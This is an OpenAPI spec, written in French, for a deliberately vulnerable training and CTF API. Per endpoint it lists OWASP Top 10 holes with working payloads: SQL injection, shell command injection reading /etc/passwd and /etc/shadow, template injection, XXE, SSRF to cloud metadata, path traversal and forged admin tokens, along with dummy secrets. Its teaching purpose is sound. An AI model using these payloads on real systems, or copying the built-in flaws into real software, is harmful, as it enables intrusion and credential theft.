openapi: "3.0.3"

info:
    title: VulnAPI
    version: "1.0.0"
    description: |
        API Go délibérément vulnérable à des fins éducatives et de CTF.
        Couvre l'**OWASP Top 10 (2021)**.

        > ⚠️ **NE PAS DÉPLOYER EN PRODUCTION**

        ### Comptes de test
        | Utilisateur | Mot de passe | Rôle  |
        |-------------|--------------|-------|
        | admin       | admin123     | admin |
        | alice       | password     | user  |
        | bob         | bob123       | user  |

        ### Authentification
        Le token est un simple `base64(JSON)` **sans signature** — il peut être forgé librement.

        **Exemple de token forgé (admin) :**
        ```
        base64({"user_id":1,"username":"hacker","role":"admin","is_admin":true,"exp":9999999999})
        ```

# ─── Credentials pour rustman ────────────────────────────────────────────────
# Ces champs sont lus automatiquement par rustman lors du Parse du spec.
# Ils pré-remplissent les champs Auth du Crawler (bearer, cookie, user/pass)
# et ajoutent le header api_key_header sur toutes les requêtes OpenAPI.
x-credentials:
    # Token forgé : base64({"user_id":1,"username":"admin","role":"admin","is_admin":true,"exp":9999999999})
    bearer: "eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImV4cCI6OTk5OTk5OTk5OX0="
    username: "admin"
    password: "admin123"
    # Header injecté sur chaque requête générée depuis le spec
    api_key_header: "X-Admin-Key"
    api_key_value: "admin123"

servers:
    - url: http://localhost:8090
      description: Serveur local

tags:
    - name: Auth
      description: "A07 — Identification & Authentication Failures"
    - name: Users
      description: "A01 — Broken Access Control / IDOR"
    - name: Injection
      description: "A03 — Injection (SQL, Command, SSTI, XXE)"
    - name: SSRF
      description: "A10 — Server-Side Request Forgery"
    - name: Misconfiguration
      description: "A05 — Security Misconfiguration"

# ─── Composants réutilisables ──────────────────────────────────────────────────

components:
    securitySchemes:
        BearerToken:
            type: http
            scheme: bearer
            description: |
                Token `base64(JSON)` sans signature HMAC — **totalement falsifiable**.

                Structure du payload :
                ```json
                {
                  "user_id": 1,
                  "username": "admin",
                  "role": "admin",
                  "is_admin": true,
                  "exp": 9999999999
                }
                ```
        AdminKey:
            type: apiKey
            in: header
            name: X-Admin-Key
            description: |
                Clé statique hardcodée. Valeurs acceptées : `admin123`, `secret`, `true`.

    schemas:
        User:
            type: object
            description: "Modèle utilisateur — contient des champs sensibles exposés (A02)"
            properties:
                id:
                    type: integer
                    example: 1
                username:
                    type: string
                    example: alice
                password:
                    type: string
                    description: "Hash MD5 exposé en clair dans les réponses (A02)"
                    example: "5f4dcc3b5aa765d61d8327deb882cf99"
                email:
                    type: string
                    example: alice@example.com
                role:
                    type: string
                    example: user
                is_admin:
                    type: boolean
                    example: false
                credit_card:
                    type: string
                    description: "Numéro de carte stocké en clair (A02)"
                    example: "4222222222222222"
                ssn:
                    type: string
                    description: "Numéro de sécurité sociale en clair (A02)"
                    example: "987-65-4321"
                api_key:
                    type: string
                    description: "Clé API personnelle en clair (A02)"
                    example: "sk-alice-api-key"
                reset_token:
                    type: string
                    description: "Token de reset exposé (A07)"

        Error:
            type: object
            properties:
                error:
                    type: string
                    description: "Message d'erreur verbeux pouvant exposer des détails internes (A05)"
                    example: "Erreur DB: UNIQUE constraint failed\nRequête: SELECT ..."

        MessageOK:
            type: object
            properties:
                message:
                    type: string
                    example: "Opération réussie"

# ─── Endpoints ────────────────────────────────────────────────────────────────

paths:
    # ══════════════════════════════════════════════════════════════════════════════
    # A04 + A02 — Mass Assignment + MD5 password hashing
    # ══════════════════════════════════════════════════════════════════════════════
    /api/register:
        post:
            tags: [Auth]
            summary: Créer un compte utilisateur
            description: |
                ### Vulnérabilités
                - **A04 — Mass Assignment** : tous les champs JSON sont liés directement au modèle,
                  y compris `role` et `is_admin`. Un attaquant peut s'enregistrer en tant qu'admin.
                - **A02 — Cryptographic Failures** : le mot de passe est haché avec MD5 (trivial à reverser).
                  La réponse retourne le hash et toutes les données sensibles.

                ### Exploit
                ```json
                {
                  "username": "hacker",
                  "password": "secret",
                  "role": "admin",
                  "is_admin": true,
                  "credit_card": "4111111111111111"
                }
                ```
            requestBody:
                required: true
                content:
                    application/json:
                        schema:
                            type: object
                            required: [username, password]
                            properties:
                                username:
                                    type: string
                                    example: hacker
                                password:
                                    type: string
                                    example: secret
                                email:
                                    type: string
                                    example: hacker@evil.com
                                role:
                                    type: string
                                    description: "A04 : ce champ ne devrait pas être accepté"
                                    example: admin
                                is_admin:
                                    type: boolean
                                    description: "A04 : ce champ ne devrait pas être accepté"
                                    example: true
                                credit_card:
                                    type: string
                                    example: "4111111111111111"
                                ssn:
                                    type: string
                                    example: "123-45-6789"
            responses:
                "201":
                    description: Compte créé (avec hash MD5 et données sensibles en réponse)
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    message:
                                        type: string
                                        example: "Utilisateur créé"
                                    user:
                                        $ref: "#/components/schemas/User"
                "400":
                    description: Champs manquants
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"
                "500":
                    description: "Erreur DB verbeux incluant le message d'erreur interne (A05)"
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

    # ══════════════════════════════════════════════════════════════════════════════
    # A07 + A03 — Auth Failures + SQL Injection dans le login
    # ══════════════════════════════════════════════════════════════════════════════
    /api/login:
        post:
            tags: [Auth]
            summary: Authentification
            description: |
                ### Vulnérabilités
                - **A07 — Auth Failures** : aucun rate-limiting, aucun lockout après échecs,
                  token retourné = `base64(JSON)` sans signature (forgeable).
                - **A03 — SQL Injection** : le `username` est injecté directement dans la requête SQL.
                - **A02** : la réponse retourne carte de crédit, SSN, API key en clair.
                - **A05** : en cas d'erreur SQL, la requête complète est retournée.

                ### Exploits
                ```json
                { "username": "admin'--", "password": "anything" }
                ```
                ```json
                { "username": "' OR '1'='1'--", "password": "x" }
                ```
            requestBody:
                required: true
                content:
                    application/json:
                        schema:
                            type: object
                            required: [username, password]
                            properties:
                                username:
                                    type: string
                                    example: "admin'--"
                                password:
                                    type: string
                                    example: anything
            responses:
                "200":
                    description: "Authentifié — token forgeable + données sensibles exposées"
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    token:
                                        type: string
                                        description: "base64(JSON) sans signature — falsifiable"
                                        example: "eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0="
                                    user:
                                        $ref: "#/components/schemas/User"
                                    hint:
                                        type: string
                                        example: "Le token est base64(json) — essayez de le modifier !"
                "401":
                    description: "Identifiants invalides (permet l'énumération d'utilisateurs — A07)"
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"
                "500":
                    description: "Requête SQL exposée dans l'erreur (A05)"
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

    # ══════════════════════════════════════════════════════════════════════════════
    # A07 — Token de reset prédictible
    # ══════════════════════════════════════════════════════════════════════════════
    /api/reset:
        post:
            tags: [Auth]
            summary: Demander un token de réinitialisation
            description: |
                ### Vulnérabilités
                - **A07** : le token est `MD5(username + timestamp_arrondi_à_la_minute)` — **prédictible**.
                - **A05** : le token est retourné directement dans la réponse HTTP au lieu d'être envoyé par email.
                - **A09** : aucun log de cet événement sensible.

                ### Exploit
                Calculer `MD5(alice + floor(now/60)*60)` pour forger le token sans le recevoir.
            requestBody:
                required: true
                content:
                    application/json:
                        schema:
                            type: object
                            required: [username]
                            properties:
                                username:
                                    type: string
                                    example: alice
            responses:
                "200":
                    description: "Token retourné en clair dans la réponse (A05)"
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    message:
                                        type: string
                                        example: "Token généré"
                                    token:
                                        type: string
                                        description: "MD5(username+timestamp) — exposé et prédictible"
                                        example: "5f4dcc3b5aa765d61d8327deb882cf99"

        put:
            tags: [Auth]
            summary: Réinitialiser le mot de passe avec un token
            description: |
                ### Vulnérabilités
                - **A07** : aucune vérification d'expiration du token.
                - **A02** : le nouveau mot de passe est haché en MD5.
            requestBody:
                required: true
                content:
                    application/json:
                        schema:
                            type: object
                            required: [username, token, new_password]
                            properties:
                                username:
                                    type: string
                                    example: alice
                                token:
                                    type: string
                                    example: "5f4dcc3b5aa765d61d8327deb882cf99"
                                new_password:
                                    type: string
                                    example: pwned123
            responses:
                "200":
                    description: Mot de passe réinitialisé
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/MessageOK"
                "400":
                    description: Token invalide
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

    # ══════════════════════════════════════════════════════════════════════════════
    # A01 — Broken Access Control : liste sans auth
    # ══════════════════════════════════════════════════════════════════════════════
    /api/users:
        get:
            tags: [Users]
            summary: Lister tous les utilisateurs
            description: |
                ### Vulnérabilités
                - **A01 — Broken Access Control** : aucune authentification requise.
                - **A02** : retourne cartes de crédit, SSN, API keys et hashes MD5 pour tous les comptes.
            responses:
                "200":
                    description: "Liste complète des utilisateurs avec données sensibles (sans auth)"
                    content:
                        application/json:
                            schema:
                                type: array
                                items:
                                    $ref: "#/components/schemas/User"

    # ══════════════════════════════════════════════════════════════════════════════
    # A01 — IDOR + Mass Assignment via PUT
    # ══════════════════════════════════════════════════════════════════════════════
    /api/users/{id}:
        parameters:
            - name: id
              in: path
              required: true
              schema:
                  type: integer
                  example: 2
              description: ID de l'utilisateur cible

        get:
            tags: [Users]
            summary: Lire le profil d'un utilisateur (IDOR)
            description: |
                ### Vulnérabilités
                - **A01 — IDOR** : aucune vérification que l'`id` appartient au token présenté.
                  N'importe quel utilisateur peut lire le profil de n'importe qui (y compris admin).
            security:
                - BearerToken: []
            responses:
                "200":
                    description: "Profil complet incluant données sensibles"
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/User"
                "404":
                    description: Utilisateur introuvable
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

        put:
            tags: [Users]
            summary: Modifier un utilisateur (IDOR + SQLi sur colonne)
            description: |
                ### Vulnérabilités
                - **A01** : aucune vérification d'appartenance — on peut modifier n'importe quel compte.
                - **A04 — Mass Assignment** : `role`, `is_admin`, `credit_card`, `password` acceptés.
                - **A03 — SQL Injection** : le nom de colonne est injecté sans échappement dans la requête `UPDATE`.

                ### Exploits
                Escalade de privilèges :
                ```json
                { "role": "admin", "is_admin": true }
                ```
                SQLi via nom de colonne :
                ```json
                { "role": "x', is_admin=1, username='hacked' --": "unused" }
                ```
            security:
                - BearerToken: []
            requestBody:
                required: true
                content:
                    application/json:
                        schema:
                            type: object
                            description: "Clé = nom de colonne (non validé), valeur = nouvelle valeur"
                            additionalProperties: true
                            example:
                                role: admin
                                is_admin: true
            responses:
                "200":
                    description: Utilisateur mis à jour
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/MessageOK"
                "500":
                    description: "Erreur DB avec requête SQL exposée (A05)"
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

        delete:
            tags: [Users]
            summary: Supprimer un utilisateur (sans ownership check)
            description: |
                ### Vulnérabilités
                - **A01** : supprime n'importe quel compte sans vérifier l'appartenance au token.
            security:
                - BearerToken: []
            responses:
                "200":
                    description: Utilisateur supprimé
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/MessageOK"

    # ══════════════════════════════════════════════════════════════════════════════
    # A01 — Broken Access Control : panneau admin
    # ══════════════════════════════════════════════════════════════════════════════
    /api/admin:
        get:
            tags: [Users]
            summary: Panneau d'administration
            description: |
                ### Vulnérabilités
                - **A01** : vérification par clé statique hardcodée (`admin123`, `secret`, `true`)
                  **OU** par token forgeable.
                - **A02** : dump complet de tous les utilisateurs avec hashes, cartes, SSN.

                ### Exploits
                Via header :
                ```
                X-Admin-Key: admin123
                ```
                Via token forgé :
                ```
                Authorization: Bearer eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImhhY2tlciIsInJvbGUiOiJhZG1pbiIsImlzX2FkbWluIjp0cnVlLCJleHAiOjk5OTk5OTk5OTl9
                ```
                *(base64 de `{"user_id":1,"username":"hacker","role":"admin","is_admin":true,"exp":9999999999}`)*
            security:
                - BearerToken: []
                - AdminKey: []
            responses:
                "200":
                    description: "Dump complet de tous les utilisateurs avec données sensibles"
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    message:
                                        type: string
                                        example: "Bienvenue admin !"
                                    users:
                                        type: array
                                        items:
                                            $ref: "#/components/schemas/User"
                                    flag:
                                        type: string
                                        example: "FLAG{broken_access_control_a01}"
                "403":
                    description: Accès refusé
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

    # ══════════════════════════════════════════════════════════════════════════════
    # A03 — SQL Injection (UNION-based, table contrôlée)
    # ══════════════════════════════════════════════════════════════════════════════
    /api/search:
        get:
            tags: [Injection]
            summary: Recherche de posts (SQL Injection)
            description: |
                ### Vulnérabilités
                - **A03 — SQL Injection** : `q` et `table` sont injectés directement dans la requête SQL.
                - **A05** : la requête SQL complète est retournée dans la réponse.

                ### Exploits
                UNION-based (dump users) :
                ```
                GET /api/search?q=' UNION SELECT 1,username,password,email,role,credit_card,ssn,api_key FROM users--
                ```
                Table injection :
                ```
                GET /api/search?table=users&q=
                ```
                Error-based :
                ```
                GET /api/search?q='
                ```
            parameters:
                - name: q
                  in: query
                  schema:
                      type: string
                  description: "Terme de recherche — injecté sans échappement (A03)"
                  example: "' UNION SELECT 1,username,password,email,role,credit_card,ssn,api_key FROM users--"
                - name: table
                  in: query
                  schema:
                      type: string
                      default: posts
                  description: "Nom de table contrôlé par l'utilisateur (A03)"
                  example: users
            responses:
                "200":
                    description: "Résultats + requête SQL exposée"
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    query:
                                        type: string
                                        description: "Requête SQL exécutée exposée en clair (A05)"
                                        example: "SELECT * FROM posts WHERE title LIKE '%test%'"
                                    results:
                                        type: array
                                        items:
                                            type: object
                                            additionalProperties: true
                "500":
                    description: "Erreur SQL avec requête complète (A05)"
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

    # ══════════════════════════════════════════════════════════════════════════════
    # A03 — Command Injection
    # ══════════════════════════════════════════════════════════════════════════════
    /api/exec:
        post:
            tags: [Injection]
            summary: Ping / exécution de commande (Command Injection)
            description: |
                ### Vulnérabilités
                - **A03 — Command Injection** : `host` est passé directement à `sh -c "ping -c 1 <host>"`.
                - **A01** : avec un token admin forgé, le champ `cmd` permet une exécution arbitraire directe.

                ### Exploits
                Via `host` (sans auth) :
                ```json
                { "host": "127.0.0.1; id; cat /etc/passwd" }
                ```
                Via `cmd` (avec token admin forgé) :
                ```json
                { "cmd": "cat /etc/shadow" }
                ```
            security:
                - BearerToken: []
            requestBody:
                required: true
                content:
                    application/json:
                        schema:
                            type: object
                            properties:
                                host:
                                    type: string
                                    description: "Adresse à pinger — injectée sans échappement dans sh -c"
                                    example: "127.0.0.1; id"
                                cmd:
                                    type: string
                                    description: "Commande directe (si token admin — lui-même forgeable)"
                                    example: "cat /etc/passwd"
            responses:
                "200":
                    description: "Sortie de la commande"
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    output:
                                        type: string
                                        example: "uid=1000(app) gid=1000(app) groups=1000(app)\n"
                                    error:
                                        type: string
                                        example: ""

    # ══════════════════════════════════════════════════════════════════════════════
    # A03 — XXE Pattern
    # ══════════════════════════════════════════════════════════════════════════════
    /api/xml:
        post:
            tags: [Injection]
            summary: Parsing XML utilisateur (XXE Pattern)
            description: |
                ### Vulnérabilités
                - **A03 — XXE Pattern** : le XML utilisateur est parsé sans validation ni whitelist.
                - **A05** : en cas d'erreur, l'input XML brut est renvoyé dans la réponse.

                > Note : la stdlib Go (`encoding/xml`) ne résout pas les entités externes par défaut,
                > mais ce pattern est exploitable dans d'autres langages/frameworks (Java, PHP, Python lxml).

                ### Payload XXE (Java / PHP / Python lxml)
                ```xml
                <?xml version="1.0"?>
                <!DOCTYPE data [
                  <!ENTITY xxe SYSTEM "file:///etc/passwd">
                ]>
                <data><user>&xxe;</user><action>read</action><content>x</content></data>
                ```
            requestBody:
                required: true
                content:
                    application/xml:
                        schema:
                            type: string
                        example: |
                            <?xml version="1.0"?>
                            <data>
                              <user>alice</user>
                              <action>read</action>
                              <content>hello</content>
                            </data>
            responses:
                "200":
                    description: "Payload parsé + raw input renvoyé (A05)"
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    parsed:
                                        type: object
                                        properties:
                                            User:
                                                type: string
                                            Action:
                                                type: string
                                            Content:
                                                type: string
                                    raw:
                                        type: string
                                        description: "Input utilisateur répercuté sans filtre"
                "400":
                    description: "Erreur XML avec input brut exposé (A05)"
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

    # ══════════════════════════════════════════════════════════════════════════════
    # A03 — Server-Side Template Injection (SSTI)
    # ══════════════════════════════════════════════════════════════════════════════
    /api/template:
        post:
            tags: [Injection]
            summary: Rendu de template utilisateur (SSTI)
            description: |
                ### Vulnérabilités
                - **A03 — SSTI** : le template est fourni par l'utilisateur et exécuté via `text/template`.
                  Un `funcMap` dangereux expose `exec` (exécution shell) et `env` (variables d'env).

                ### Exploits
                Exécution de commande :
                ```json
                { "template": "{{exec \"id\"}}", "data": {} }
                ```
                Lecture de variable d'environnement :
                ```json
                { "template": "{{env \"HOME\"}}", "data": {} }
                ```
                Exfiltration de fichier :
                ```json
                { "template": "{{exec \"cat /etc/passwd\"}}", "data": {} }
                ```
            requestBody:
                required: true
                content:
                    application/json:
                        schema:
                            type: object
                            properties:
                                template:
                                    type: string
                                    description: "Template Go — `exec` et `env` disponibles dans le funcMap (A03)"
                                    example: '{{exec "id"}}'
                                data:
                                    type: object
                                    description: "Variables injectées dans le contexte du template"
                                    additionalProperties: true
                                    example:
                                        Name: "Alice"
            responses:
                "200":
                    description: "Résultat du rendu"
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    result:
                                        type: string
                                        example: "uid=1000(app) gid=1000(app)"
                "400":
                    description: Erreur de parsing du template
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

    # ══════════════════════════════════════════════════════════════════════════════
    # A10 — SSRF
    # ══════════════════════════════════════════════════════════════════════════════
    /api/fetch:
        post:
            tags: [SSRF]
            summary: Récupérer une URL distante (SSRF)
            description: |
                ### Vulnérabilités
                - **A10 — SSRF** : l'URL est passée sans validation au client HTTP interne.
                  Permet d'atteindre les services internes, les métadonnées cloud et les ressources localhost.

                ### Exploits
                Endpoint interne :
                ```json
                { "url": "http://localhost:8080/api/debug" }
                ```
                Métadonnées AWS IMDSv1 :
                ```json
                { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
                ```
                Métadonnées GCP :
                ```json
                { "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" }
                ```
                Scan de port interne :
                ```json
                { "url": "http://db.internal:5432" }
                ```
            requestBody:
                required: true
                content:
                    application/json:
                        schema:
                            type: object
                            required: [url]
                            properties:
                                url:
                                    type: string
                                    description: "URL à fetcher — aucune validation (A10)"
                                    example: "http://169.254.169.254/latest/meta-data/"
            responses:
                "200":
                    description: "Réponse de la ressource interne/externe"
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    status:
                                        type: integer
                                        example: 200
                                    headers:
                                        type: object
                                        additionalProperties:
                                            type: string
                                    body:
                                        type: string
                                        example: "ami-id\nami-launch-index\nami-manifest-path\n..."
                "500":
                    description: Erreur réseau
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

    # ══════════════════════════════════════════════════════════════════════════════
    # A05 — Security Misconfiguration : endpoint debug
    # ══════════════════════════════════════════════════════════════════════════════
    /api/debug:
        get:
            tags: [Misconfiguration]
            summary: Informations de debug (toujours actif, sans auth)
            description: |
                ### Vulnérabilités
                - **A05 — Security Misconfiguration** : endpoint de debug activé en production,
                  sans authentification.
                - Expose les variables d'environnement, le chemin de la DB, les secrets hardcodés,
                  les IPs internes.
            responses:
                "200":
                    description: "Dump complet de la configuration interne"
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    app:
                                        type: string
                                        example: "VulnAPI v1.0"
                                    db_path:
                                        type: string
                                        example: "/tmp/vulnapi.db"
                                    env:
                                        type: object
                                        description: "Variables d'environnement complètes du processus"
                                        additionalProperties:
                                            type: string
                                    internals:
                                        type: object
                                        description: "Secrets hardcodés exposés"
                                        properties:
                                            jwt_secret:
                                                type: string
                                                example: "supersecret123"
                                            db_password:
                                                type: string
                                                example: "admin123"
                                            aws_key_id:
                                                type: string
                                                example: "AKIAIOSFODNN7EXAMPLE"
                                            stripe_secret:
                                                type: string
                                                example: "sk_live_FAKE_KEY_DEMO"
                                    network:
                                        type: object
                                        properties:
                                            internal_subnet:
                                                type: string
                                                example: "192.168.1.0/24"
                                            db_host:
                                                type: string
                                                example: "db.internal:5432"

    # ══════════════════════════════════════════════════════════════════════════════
    # A01 — Path Traversal
    # ══════════════════════════════════════════════════════════════════════════════
    /api/files:
        get:
            tags: [Misconfiguration]
            summary: Lire un fichier par chemin (Path Traversal)
            description: |
                ### Vulnérabilités
                - **A01 — Path Traversal** : le paramètre `path` est passé directement à `os.ReadFile`
                  sans sanitisation.

                ### Exploits
                ```
                GET /api/files?path=../../etc/passwd
                GET /api/files?path=/etc/shadow
                GET /api/files?path=/proc/self/environ
                GET /api/files?path=/tmp/vulnapi.db
                ```
            parameters:
                - name: path
                  in: query
                  required: true
                  schema:
                      type: string
                  description: "Chemin vers le fichier — aucune sanitisation (A01)"
                  example: "../../etc/passwd"
            responses:
                "200":
                    description: "Contenu du fichier"
                    content:
                        text/plain:
                            schema:
                                type: string
                                example: "root:x:0:0:root:/root:/bin/bash\n..."
                "500":
                    description: "Erreur de lecture avec chemin exposé"
                    content:
                        application/json:
                            schema:
                                $ref: "#/components/schemas/Error"

    # ══════════════════════════════════════════════════════════════════════════════
    # A05 — Hardcoded secrets exposés
    # ══════════════════════════════════════════════════════════════════════════════
    /api/config:
        get:
            tags: [Misconfiguration]
            summary: Configuration de l'application (secrets hardcodés exposés)
            description: |
                ### Vulnérabilités
                - **A05 — Security Misconfiguration** : endpoint accessible sans authentification.
                - **A02** : credentials hardcodés pour DB, AWS, SMTP, Stripe exposés publiquement.
                - **A01** : aucun contrôle d'accès.
            responses:
                "200":
                    description: "Configuration complète avec credentials en clair"
                    content:
                        application/json:
                            schema:
                                type: object
                                properties:
                                    database:
                                        type: object
                                        properties:
                                            host:
                                                type: string
                                                example: "db.internal"
                                            port:
                                                type: string
                                                example: "5432"
                                            name:
                                                type: string
                                                example: "production_db"
                                            user:
                                                type: string
                                                example: "dbadmin"
                                            password:
                                                type: string
                                                example: "Sup3rS3cr3t!Prod"
                                    jwt:
                                        type: object
                                        properties:
                                            secret:
                                                type: string
                                                example: "supersecret123"
                                            algorithm:
                                                type: string
                                                example: "HS256"
                                    aws:
                                        type: object
                                        properties:
                                            access_key_id:
                                                type: string
                                                example: "AKIAIOSFODNN7EXAMPLE"
                                            secret_access_key:
                                                type: string
                                                example: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
                                            region:
                                                type: string
                                                example: "eu-west-1"
                                            s3_bucket:
                                                type: string
                                                example: "corp-backups-prod"
                                    smtp:
                                        type: object
                                        properties:
                                            host:
                                                type: string
                                                example: "smtp.gmail.com"
                                            user:
                                                type: string
                                                example: "noreply@corp.local"
                                            password:
                                                type: string
                                                example: "GmailAppPass123!"
                                    stripe:
                                        type: object
                                        properties:
                                            secret_key:
                                                type: string
                                                example: "sk_live_FAKE_DEMO_KEY_NOT_REAL"
